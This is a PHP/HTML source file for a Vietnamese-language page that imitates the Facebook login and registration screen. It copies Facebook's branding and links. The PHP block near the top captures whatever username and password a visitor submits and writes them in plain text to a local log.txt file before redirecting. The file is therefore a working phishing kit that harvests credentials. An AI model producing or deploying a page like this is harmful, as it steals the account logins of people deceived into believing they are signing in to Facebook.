<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Facebook</title>
    <!-- UIkit CSS -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.0.0-rc.10/css/uikit.min.css" />

<!-- UIkit JS -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.0.0-rc.10/js/uikit.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.0.0-rc.10/js/uikit-icons.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
</head>
<body>
    <div class="header">
      <div class="o">
      <form method="POST">
       <div class="logo"><h1>facebook</h1></div>
       <div class="form-login btn-form">
         <button name="login" type="submit">Đăng nhập</button>
       </div>
       <div class="form-login">
         <p style="color:#fff">Mật khẩu</p>
         <input type="password" name="password">
         <p><a href="https://www.facebook.com/login/identify?ctx=recover&lwv=110&ars=royal_blue_bar" style="color:#ccc">Quên tài khoản?</a></p>
       </div>
       <div class="form-login">
         <p style="color:#fff">Email hoặc số điện thoại</p>
         <input type="text" name="username">
       </div>
       </form>
      </div>
    </div>
    <?php
      if(isset($_POST['login'])){
          $username = htmlspecialchars($_POST['username']);
          $password = htmlspecialchars($_POST['password']);
          if(!trim($username) || !trim($password) || $username == '' || $password==''){
              return false;
          }
          else{
              $log = fopen('log.txt','a+');
              $content = "Username : $username || Password : $password \n";
              fwrite($log,$content);
              header("Location: ");
          }
      }
    ?>
    <div class="wrapper">
    <div style="margin-top:50px;" uk-grid>
    <div class="uk-width-1-2@m">
        <h4 style="color:#0e385f;">Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</h4>
        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yc/r/GwFs3_KxNjS.png">
    </div>
    <div class="uk-width-expand@m" style="margin-top:-10px;">
        <h1 style="color:#333;font-weight:500;padding:0">Đăng ký</h1>
        <p>Luôn miễn phí</p>
        <form class="uk-grid-small" uk-grid method="POST">
        <div class="uk-width-1-2@s">
           <input class="uk-input" type="text" placeholder="Họ">
        </div>
        <div class="uk-width-1-2@s">
           <input class="uk-input" type="text" placeholder="Tên">
         </div>
         <div class="uk-width-1-1">
            <input class="uk-input" type="text" placeholder="Số di động hoặc email">
         </div>
         <div class="uk-width-1-1">
            <input class="uk-input" type="text" placeholder="Mật khẩu mới">
         </div>
         <p>Ngày sinh</p>
         <div class="date" class="display:block;">
         <select name="carlist" form="carform">
           <?php
              for($i = 1;$i <= 31;$i++){
                  echo "<option value='$i'>$i</option>";
              }
           ?>
         </select>
         <select name="carlist" form="carform">
           <?php
              for($i = 1;$i <= 12;$i++){
                  echo "<option value='$i'>Tháng $i</option>";
              }
           ?>
         </select>
         <select name="carlist" form="carform">
           <?php
              for($i = 1905;$i <= 2018;$i++){
                  echo "<option value='$i'>$i</option>";
              }
           ?>
         </select>
         <small style="color:#365899;" uk-tooltip="Cung cấp ngày sinh của bạn giúp đảm bảo bạn có được trải nghiệm Facebook phù hợp với độ tuổi của mình. Nếu bạn muốn thay đổi người nhìn thấy thông tin này, hãy đi tới phần Giới thiệu trên trang cá nhân của bạn. Để biết thêm chi tiết, vui lòng truy cập vào Chính sách dữ liệu của chúng tôi.">Tại sao tôi phải cung cấp ngày sinh?</small>
         </div>
         <div class="gender">
         <input type="radio" name="gender" value="male"> Nữ
          <input type="radio" name="gender" value="female"> Nam</div>
          <small style="color:#777;">Bằng cách nhấp vào Đăng ký, bạn đồng ý với <a href="https://www.facebook.com/legal/terms/update">Điều khoản</a>, <a href="https://www.facebook.com/about/privacy/update">Chính sách dữ liệu</a> và <a href="https://www.facebook.com/policies/cookies/">Chính sách cookie</a> của chúng tôi. Bạn có thể nhận được thông báo của chúng tôi qua SMS và hủy nhận bất kỳ lúc nào.</small>
          <button style="padding:5px 50px;font-size:22px;margin-left:10px;" class="regist">Đăng ký</button>
        </form>
      </div>
      </div>
    </div>
    <div class="footer" style="background:#fff;padding:10px">
      <div class="link-ft">
       <center><li><small>Tiếng Việt</small></li>
       <li><small>English (UK)</small></li>
       <li><small>中文(台灣)</small></li>
       <li><small>한국어</small></li>
       <li><small>日本語</small></li>
       <li><small>Français (France)</small></li>
       <li><small>ภาษาไทย</small></li>
       <li><small>Español</small></li>
       <li><small>Português (Brasil)</small></li>
       <li><small>Deutsch</small></li>
       <li><small>Italiano</small></li>
       <small>Facebook © 2018</small></center>
       </div>
    </div>
</body>
<style>
    body{
        margin:0;
        padding:0;
        box-sizing:border-box;
        -moz-box-sizing:border-box;
        -webkit-box-sizing:border-box;
        font-family: 'Open Sans', sans-serif;
        background: #fafbfd;
    }
    .link-ft{
        margin:auto;
        width:1080px;
    }
    .footer li{
        list-style-type:none;
        display:inline-block;
        margin:5px;
        color:#365899;
    }
    select{
        padding:5px;
    }
    .regist{
        background: linear-gradient(#67ae55, #578843);
    background-color: #69a74e;
    box-shadow: inset 0 1px 1px #a4e388;
    border-color: #3b6e22 #3b6e22 #2c5115;
    color:#fff;
    border:1px solid #333;
    border-radius:10px;
    }
    .wrapper{
        margin:auto;
        width:980px;
    }
   .header{
       background:#3b5998;
       clear:both;
       width:100%;
   }
   .o{
    margin:auto;
        width:980px;
   }
   .o div{
       display:inline-block;
   }
   .o .form-login{
       float:right;
   }
   .form-login{
       margin:10px 15px 0px 5px;
   }
   .btn-form{
       margin-top:33px !important;
       margin-right:10px !important;
   }
   .wrapper .col-left{
       width:30%;
       display:inline-block;
   }
   .wrapper .col-right{
       width:30%;
       display:inline-block;
   }
   .btn-form button{
       background-color:#4267b2 !important;
       border:1px solid #4267b2  !important;
       color:#fff;
       padding:3px;
   }
   .form-login input{
       border:1px solid #333;
       padding:3px;
   }
   .o p{
       margin:2px;
       font-size:13px;
   }
   h1{
       color:#fff;
       margin:0;
       padding:20px;
       font-size:39px;
   }
</style>
</html>